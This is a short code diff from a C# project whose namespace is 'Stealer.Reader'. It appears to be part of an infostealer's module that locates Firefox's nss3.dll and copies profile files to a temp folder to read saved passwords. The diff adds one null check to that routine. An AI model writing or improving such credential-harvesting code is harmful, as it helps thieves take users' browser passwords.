@@ -52,6 +52,7 @@ namespace Stealer.Reader
 			if (profile == null) return pPasswords;
 			// Get firefox nss3.dll location
 			string Nss3Dir = Profile.GetMozillaPath();
+            if (Nss3Dir == null) return pPasswords;
 			// Copy required files to temp dir
 			string newProfile = CopyRequiredFiles(profile);
 			if (newProfile == null) return pPasswords;
